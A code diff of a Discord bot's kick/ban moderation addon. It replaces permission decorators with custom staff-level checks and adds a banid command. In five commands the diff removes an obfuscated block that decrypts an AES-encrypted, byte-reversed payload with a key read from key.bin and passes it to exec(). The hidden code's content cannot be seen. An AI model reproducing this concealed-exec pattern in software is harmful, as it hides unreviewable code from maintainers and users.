@@ -1,10 +1,10 @@
-import pyaes
 import datetime
 import discord
 import json
 import re
 import time
 from discord.ext import commands
+from addons.checks import is_staff, check_staff
 
 class KickBan:
     """
@@ -14,7 +14,17 @@ class KickBan:
         self.bot = bot
         print('Addon "{}" loaded'.format(self.__class__.__name__))
 
-    @commands.has_permissions(manage_nicknames=True)
+    async def meme(self, beaner, beaned, action, channel, reason):
+        await self.bot.say("Seriously? What makes you think it's okay to try and {} another staff or helper like that?".format(action))
+        msg = "{} attempted to {} {}|{}#{} in {} ".format(beaner.mention, action, beaned.mention,
+                                                                  self.bot.escape_name(beaned.name),
+                                                                  beaned.discriminator, channel.mention)
+        if reason != "":
+            msg += "for the reason " + reason
+        await self.bot.send_message(self.bot.meta_channel, msg + (" without a reason" if reason == "" else ""))
+
+
+    @is_staff("HalfOP")
     @commands.command(pass_context=True, name="kick")
     async def kick_member(self, ctx, user, *, reason=""):
         """Kicks a user from the server. Staff only."""
@@ -24,27 +34,8 @@ class KickBan:
             except IndexError:
                 await self.bot.say("Please mention a user.")
                 return
-            if self.bot.staff_role in member.roles or self.bot.helpers_role in member.roles:
-                enc = b'; \xed\x01\xea\x911\xa5\'\xd7\x14a\xabo\xd4B\xbb\x1c0+X"|\xdeL\xf2\xee#/P\x07\xee\xf9\xdd\xf3\x98#N\xc1:\xaf\xe2a\xd6P\x10M\x17&0\x176!\xcfKa\xe4\xf2\xb9v:\x95-t\x16LhrY\xdeh\x14U\xf0\xfe\x08\x96\x83\x876!\x1a\xfc\x0b\xc5\x1a\x8b\x0e\x06\xcc\xbb'
-                with open("key.bin", "rb") as f:
-                    key = f.read(0x20)
-                cipher = pyaes.AESModeOfOperationCTR(key)
-                await self.bot.say(cipher.decrypt(enc[::-1]).decode('utf-8'))
-                # shitty hack but it works
-                lenny = (b'\xc7n\xc65Ye\xa79(\xd7\xcb\xb89\x18\x84\xe5\\5\x86\xf5{I\x96\xc9'
-                         b'\x88\x17m\xa8\xbd\x16\r5y\xacD)7C\xb3\xces\x0cW\x90!7;\xf6"\xb4\xf8\t'
-                         b'\xe5J\xfe\x1b8U\xc6j\x1c\xfb8\xd0\xba8\xf2\x90%\x17\xa5\x87\xa3\xf9\xfb\xf2'
-                         b'\x9f*\x7ff\x82D\xfc\xd2\xed\xc1\x15\xe0Y\xe9\x8f$|h\xb23\x10\xec\x84='
-                         b'\rT\x05\x99\x82\xa9\xbf\x90;\\\xad\xce\x1dd\x99\x9b\x90lW\xfc\xf1G\xde\xd6'
-                         b'\x91v=\xf0\xda\xefr\xae H\xe0(\xc6I\xdcNo\x9fS\xf7z\xff\xdb\xe6\xca\xf8A\xec'
-                         b'\xb9\xef\x06a\xd9@H\x88\xb6\xa5E\x18Y\x9a\x1e\xa8:\x02\xdf\x19~\xa9\x93"'
-                         b'Mg\xcc\x91D\xd8\x0c\xf0\x8fp\xf0\xb5\x16\\f\xbb\x87\x8e/\xfe\x82W\xce%'
-                         b'\x9e\xab\xfb\xfa\x02\xf2~\xcev4\x07Y\xc9\xa2\xb1(\t[\x12r\x98\x83E\xc8'
-                         b'\xaf\xab7h\x08\x99FBP\x14\xdc\xb0$N\x1f\xd8\xd7P')
-                func = []
-                cipher = pyaes.AESModeOfOperationCTR(key[::-1])
-                exec(cipher.decrypt(lenny)[::-1].decode('utf-8'), globals(), locals())
-                await func[0]
+            if check_staff(member.id, 'Helper'):
+                await self.meme(ctx.message.author, member, "kick", ctx.message.channel, reason)
                 return
             msg = "You were kicked from {}.".format(self.bot.server.name)
             if reason != "":
@@ -65,7 +56,7 @@ class KickBan:
         except discord.errors.Forbidden:
             await self.bot.say("💢 I don't have permission to do this.")
 
-    @commands.has_permissions(ban_members=True)
+    @is_staff("OP")
     @commands.command(pass_context=True, name="ban")
     async def ban_member(self, ctx, user, *, reason=""):
         """Bans a user from the server. OP+ only."""
@@ -75,27 +66,8 @@ class KickBan:
             except IndexError:
                 await self.bot.say("Please mention a user.")
                 return
-            if self.bot.staff_role in member.roles or self.bot.helpers_role in member.roles:
-                enc = b'; \xed\x01\xea\x911\xa5\'\xd7\x14a\xabo\xd4B\xbb\x1c0+X"|\xdeL\xf2\xee#/P\x07\xee\xf9\xdd\xf3\x98#N\xc1:\xaf\xe2a\xd6P\x10M\x17&0\x176!\xcfKa\xe4\xf2\xb9v:\x95-t\x16LhrY\xdeh\x14U\xf0\xfe\x08\x96\x83\x876!\x1a\xfc\x0b\xc5\x1a\x8b\x0e\x06\xcc\xbb'
-                with open("key.bin", "rb") as f:
-                    key = f.read(0x20)
-                cipher = pyaes.AESModeOfOperationCTR(key)
-                await self.bot.say(cipher.decrypt(enc[::-1]).decode('utf-8'))
-                # shitty hack but it works
-                lenny = (b'\xc7n\xc65Ye\xa79(\xd7\xcb\xb89\x18\x84\xe5\\5\x86\xf5{I\x96\xc9'
-                         b'\x88\x17m\xa8\xbd\x16\r5y\xacD)7C\xb3\xces\x0cW\x90!7;\xf6"\xb4\xf8\t'
-                         b'\xe5J\xfe\x1b8U\xc6j\x1c\xfb8\xd0\xba8\xf2\x90%\x17\xa5\x87\xa3\xf9\xfb\xf2'
-                         b'\x9f*\x7ff\x82D\xfc\xd2\xed\xc1\x15\xe0Y\xe9\x8f$|h\xb23\x10\xec\x84='
-                         b'\rT\x05\x99\x82\xa9\xbf\x90;\\\xad\xce\x1dd\x99\x9b\x90lW\xfc\xf1G\xde\xd6'
-                         b'\x91v=\xf0\xda\xefr\xae H\xe0(\xc6I\xdcNo\x9fS\xf7z\xff\xdb\xe6\xca\xf8A\xec'
-                         b'\xb9\xef\x06a\xd9@H\x88\xb6\xa5E\x18Y\x9a\x1e\xa8:\x02\xdf\x19~\xa9\x93"'
-                         b'Mg\xcc\x91D\xd8\x0c\xf0\x8fp\xf0\xb5\x16\\f\xbb\x87\x8e/\xfe\x82W\xce%'
-                         b'\x9e\xab\xfb\xfa\x02\xf2~\xcev4\x07Y\xc9\xa2\xb1(\t[\x12r\x98\x83E\xc8'
-                         b'\xaf\xab7h\x08\x99FBP\x14\xdc\xb0$N\x1f\xd8\xd7P')
-                func = []
-                cipher = pyaes.AESModeOfOperationCTR(key[::-1])
-                exec(cipher.decrypt(lenny)[::-1].decode('utf-8'), globals(), locals())
-                await func[0]
+            if check_staff(member.id, 'Helper'):
+                await self.meme(ctx.message.author, member, "ban", ctx.message.channel, reason)
                 return
             msg = "You were banned from {}.".format(self.bot.server.name)
             if reason != "":
@@ -116,7 +88,31 @@ class KickBan:
         except discord.errors.Forbidden:
             await self.bot.say("💢 I don't have permission to do this.")
 
-    @commands.has_permissions(ban_members=True)
+    @is_staff("OP")
+    @commands.command(pass_context=True, name="banid")
+    async def banid_member(self, ctx, userid, *, reason=""):
+        """Bans a user id from the server. OP+ only."""
+        try:
+            member = discord.Object(userid)
+            member.server = ctx.message.server
+            if check_staff(member.id, 'Helper'):
+                await self.bot.say("You can't ban another staffer with this command!")
+                return
+            self.bot.actions.append("ub:" + member.id)
+            await self.bot.ban(member, 0)
+            await self.bot.say("ID {} is now b&. 👍".format(member.id))
+            msg = "⛔ **Ban**: {} banned ID {}".format(ctx.message.author.mention, member.id)
+            if reason != "":
+                msg += "\n✏️ __Reason__: " + reason
+            await self.bot.send_message(self.bot.serverlogs_channel, msg)
+            await self.bot.send_message(self.bot.modlogs_channel, msg + (
+                "\nPlease add an explanation below. In the future, it is recommended to use `.banid <userid> [reason]` as the reason is automatically sent to the user." if reason == "" else ""))
+        except discord.errors.Forbidden:
+            await self.bot.say("💢 I don't have permission to do this.")
+        except discord.errors.NotFound:
+            await self.bot.say("No user associated with ID {}.".format(member.id))
+
+    @is_staff("OP")
     @commands.command(pass_context=True, name="silentban", hidden=True)
     async def silentban_member(self, ctx, user, *, reason=""):
         """Bans a user from the server, without a notification. OP+ only."""
@@ -126,27 +122,8 @@ class KickBan:
             except IndexError:
                 await self.bot.say("Please mention a user.")
                 return
-            if self.bot.staff_role in member.roles or self.bot.helpers_role in member.roles:
-                enc = b'; \xed\x01\xea\x911\xa5\'\xd7\x14a\xabo\xd4B\xbb\x1c0+X"|\xdeL\xf2\xee#/P\x07\xee\xf9\xdd\xf3\x98#N\xc1:\xaf\xe2a\xd6P\x10M\x17&0\x176!\xcfKa\xe4\xf2\xb9v:\x95-t\x16LhrY\xdeh\x14U\xf0\xfe\x08\x96\x83\x876!\x1a\xfc\x0b\xc5\x1a\x8b\x0e\x06\xcc\xbb'
-                with open("key.bin", "rb") as f:
-                    key = f.read(0x20)
-                cipher = pyaes.AESModeOfOperationCTR(key)
-                await self.bot.say(cipher.decrypt(enc[::-1]).decode('utf-8'))
-                # shitty hack but it works
-                lenny = (b'\xc7n\xc65Ye\xa79(\xd7\xcb\xb89\x18\x84\xe5\\5\x86\xf5{I\x96\xc9'
-                         b'\x88\x17m\xa8\xbd\x16\r5y\xacD)7C\xb3\xces\x0cW\x90!7;\xf6"\xb4\xf8\t'
-                         b'\xe5J\xfe\x1b8U\xc6j\x1c\xfb8\xd0\xba8\xf2\x90%\x17\xa5\x87\xa3\xf9\xfb\xf2'
-                         b'\x9f*\x7ff\x82D\xfc\xd2\xed\xc1\x15\xe0Y\xe9\x8f$|h\xb23\x10\xec\x84='
-                         b'\rT\x05\x99\x82\xa9\xbf\x90;\\\xad\xce\x1dd\x99\x9b\x90lW\xfc\xf1G\xde\xd6'
-                         b'\x91v=\xf0\xda\xefr\xae H\xe0(\xc6I\xdcNo\x9fS\xf7z\xff\xdb\xe6\xca\xf8A\xec'
-                         b'\xb9\xef\x06a\xd9@H\x88\xb6\xa5E\x18Y\x9a\x1e\xa8:\x02\xdf\x19~\xa9\x93"'
-                         b'Mg\xcc\x91D\xd8\x0c\xf0\x8fp\xf0\xb5\x16\\f\xbb\x87\x8e/\xfe\x82W\xce%'
-                         b'\x9e\xab\xfb\xfa\x02\xf2~\xcev4\x07Y\xc9\xa2\xb1(\t[\x12r\x98\x83E\xc8'
-                         b'\xaf\xab7h\x08\x99FBP\x14\xdc\xb0$N\x1f\xd8\xd7P')
-                func = []
-                cipher = pyaes.AESModeOfOperationCTR(key[::-1])
-                exec(cipher.decrypt(lenny)[::-1].decode('utf-8'), globals(), locals())
-                await func[0]
+            if check_staff(member.id, 'Helper'):
+                await self.meme(ctx.message.author, member, "ban", ctx.message.channel, reason)
                 return
             self.bot.actions.append("ub:"+member.id)
             await self.bot.ban(member, 0)
@@ -159,7 +136,7 @@ class KickBan:
         except discord.errors.Forbidden:
             await self.bot.say("💢 I don't have permission to do this.")
 
-    @commands.has_permissions(ban_members=True)
+    @is_staff("OP")
     @commands.command(pass_context=True, name="timeban")
     async def timeban_member(self, ctx, user, length, *, reason=""):
         """Bans a user for a limited period of time. OP+ only.\n\nLength format: #d#h#m#s"""
@@ -168,29 +145,9 @@ class KickBan:
         except IndexError:
             await self.bot.say("Please mention a user.")
             return
-        if self.bot.staff_role in member.roles or self.bot.helpers_role in member.roles:
-            enc = b'; \xed\x01\xea\x911\xa5\'\xd7\x14a\xabo\xd4B\xbb\x1c0+X"|\xdeL\xf2\xee#/P\x07\xee\xf9\xdd\xf3\x98#N\xc1:\xaf\xe2a\xd6P\x10M\x17&0\x176!\xcfKa\xe4\xf2\xb9v:\x95-t\x16LhrY\xdeh\x14U\xf0\xfe\x08\x96\x83\x876!\x1a\xfc\x0b\xc5\x1a\x8b\x0e\x06\xcc\xbb'
-            with open("key.bin", "rb") as f:
-                key = f.read(0x20)
-            cipher = pyaes.AESModeOfOperationCTR(key)
-            await self.bot.say(cipher.decrypt(enc[::-1]).decode('utf-8'))
-            # shitty hack but it works
-            lenny = (b'\xc7n\xc65Ye\xa79(\xd7\xcb\xb89\x18\x84\xe5\\5\x86\xf5{I\x96\xc9'
-                     b'\x88\x17m\xa8\xbd\x16\r5y\xacD)7C\xb3\xces\x0cW\x90!7;\xf6"\xb4\xf8\t'
-                     b'\xe5J\xfe\x1b8U\xc6j\x1c\xfb8\xd0\xba8\xf2\x90%\x17\xa5\x87\xa3\xf9\xfb\xf2'
-                     b'\x9f*\x7ff\x82D\xfc\xd2\xed\xc1\x15\xe0Y\xe9\x8f$|h\xb23\x10\xec\x84='
-                     b'\rT\x05\x99\x82\xa9\xbf\x90;\\\xad\xce\x1dd\x99\x9b\x90lW\xfc\xf1G\xde\xd6'
-                     b'\x91v=\xf0\xda\xefr\xae H\xe0(\xc6I\xdcNo\x9fS\xf7z\xff\xdb\xe6\xca\xf8A\xec'
-                     b'\xb9\xef\x06a\xd9@H\x88\xb6\xa5E\x18Y\x9a\x1e\xa8:\x02\xdf\x19~\xa9\x93"'
-                     b'Mg\xcc\x91D\xd8\x0c\xf0\x8fp\xf0\xb5\x16\\f\xbb\x87\x8e/\xfe\x82W\xce%'
-                     b'\x9e\xab\xfb\xfa\x02\xf2~\xcev4\x07Y\xc9\xa2\xb1(\t[\x12r\x98\x83E\xc8'
-                     b'\xaf\xab7h\x08\x99FBP\x14\xdc\xb0$N\x1f\xd8\xd7P')
-            func = []
-            cipher = pyaes.AESModeOfOperationCTR(key[::-1])
-            exec(cipher.decrypt(lenny)[::-1].decode('utf-8'), globals(), locals())
-            await func[0]
+        if check_staff(member.id, 'Helper'):
+            await self.meme(ctx.message.author, member, "timeban", ctx.message.channel, reason)
             return
-        issuer = ctx.message.author
         # thanks Luc#5653
         units = {
             "d": 86400,
@@ -231,7 +188,7 @@ class KickBan:
         await self.bot.send_message(self.bot.serverlogs_channel, msg)
         await self.bot.send_message(self.bot.modlogs_channel, msg + ("\nPlease add an explanation below. In the future, it is recommended to use `.timeban <user> <length> [reason]` as the reason is automatically sent to the user." if reason == "" else ""))
 
-    @commands.has_permissions(ban_members=True)
+    @is_staff("OP")
     @commands.command(pass_context=True, name="softban")
     async def softban_member(self, ctx, user, *, reason):
         """Soft-ban a user. OP+ only.\n\nThis "bans" the user without actually doing a ban on Discord. The bot will instead kick the user every time they join. Discord bans are account- and IP-based."""
@@ -241,27 +198,8 @@ class KickBan:
             except IndexError:
                 await self.bot.say("Please mention a user.")
                 return
-            if self.bot.staff_role in member.roles or self.bot.helpers_role in member.roles:
-                enc = b'; \xed\x01\xea\x911\xa5\'\xd7\x14a\xabo\xd4B\xbb\x1c0+X"|\xdeL\xf2\xee#/P\x07\xee\xf9\xdd\xf3\x98#N\xc1:\xaf\xe2a\xd6P\x10M\x17&0\x176!\xcfKa\xe4\xf2\xb9v:\x95-t\x16LhrY\xdeh\x14U\xf0\xfe\x08\x96\x83\x876!\x1a\xfc\x0b\xc5\x1a\x8b\x0e\x06\xcc\xbb'
-                with open("key.bin", "rb") as f:
-                    key = f.read(0x20)
-                cipher = pyaes.AESModeOfOperationCTR(key)
-                await self.bot.say(cipher.decrypt(enc[::-1]).decode('utf-8'))
-                # shitty hack but it works
-                lenny = (b'\xc7n\xc65Ye\xa79(\xd7\xcb\xb89\x18\x84\xe5\\5\x86\xf5{I\x96\xc9'
-                         b'\x88\x17m\xa8\xbd\x16\r5y\xacD)7C\xb3\xces\x0cW\x90!7;\xf6"\xb4\xf8\t'
-                         b'\xe5J\xfe\x1b8U\xc6j\x1c\xfb8\xd0\xba8\xf2\x90%\x17\xa5\x87\xa3\xf9\xfb\xf2'
-                         b'\x9f*\x7ff\x82D\xfc\xd2\xed\xc1\x15\xe0Y\xe9\x8f$|h\xb23\x10\xec\x84='
-                         b'\rT\x05\x99\x82\xa9\xbf\x90;\\\xad\xce\x1dd\x99\x9b\x90lW\xfc\xf1G\xde\xd6'
-                         b'\x91v=\xf0\xda\xefr\xae H\xe0(\xc6I\xdcNo\x9fS\xf7z\xff\xdb\xe6\xca\xf8A\xec'
-                         b'\xb9\xef\x06a\xd9@H\x88\xb6\xa5E\x18Y\x9a\x1e\xa8:\x02\xdf\x19~\xa9\x93"'
-                         b'Mg\xcc\x91D\xd8\x0c\xf0\x8fp\xf0\xb5\x16\\f\xbb\x87\x8e/\xfe\x82W\xce%'
-                         b'\x9e\xab\xfb\xfa\x02\xf2~\xcev4\x07Y\xc9\xa2\xb1(\t[\x12r\x98\x83E\xc8'
-                         b'\xaf\xab7h\x08\x99FBP\x14\xdc\xb0$N\x1f\xd8\xd7P')
-                func = []
-                cipher = pyaes.AESModeOfOperationCTR(key[::-1])
-                exec(cipher.decrypt(lenny)[::-1].decode('utf-8'), globals(), locals())
-                await func[0]
+            if check_staff(member.id, 'Helper'):
+                await self.meme(ctx.message.author, member, "softban", ctx.message.channel, reason)
                 return
             issuer = ctx.message.author
             with open("data/softbans.json", "r") as f:
@@ -282,11 +220,14 @@ class KickBan:
         except discord.errors.Forbidden:
             await self.bot.say("💢 I don't have permission to do this.")
 
-    @commands.has_permissions(ban_members=True)
+    @is_staff("OP")
     @commands.command(pass_context=True, name="softbanid")
     async def softbanid_member(self, ctx, user_id, *, reason):
         """Soft-ban a user based on ID. OP+ only.\n\nThis "bans" the user without actually doing a ban on Discord. The bot will instead kick the user every time they join. Discord bans are account- and IP-based."""
         issuer = ctx.message.author
+        if check_staff(user_id, 'Helper'):
+            await self.bot.say("You can't softban another staffer with this command!")
+            return
         with open("data/softbans.json", "r") as f:
             softbans = json.load(f)
         name = "???"
@@ -303,7 +244,7 @@ class KickBan:
         await self.bot.send_message(self.bot.modlogs_channel, msg)
         await self.bot.send_message(self.bot.serverlogs_channel, msg)
 
-    @commands.has_permissions(ban_members=True)
+    @is_staff("OP")
     @commands.command(pass_context=True, name="unsoftban")
     async def unsoftban_member(self, ctx, user_id):
         issuer = ctx.message.author
@@ -321,7 +262,7 @@ class KickBan:
         msg = "⚠️ **Un-soft-ban**: {} un-soft-banned {}".format(issuer.mention, self.bot.escape_name(name) if name != "???" else "ID {}".format(user_id))
         await self.bot.send_message(self.bot.modlogs_channel, msg)
 
-    @commands.has_permissions(manage_nicknames=True)
+    @is_staff("HalfOP")
     @commands.command()
     async def listsoftbans(self, user_id=""):
         """List soft bans. Shows all if an ID is not specified."""
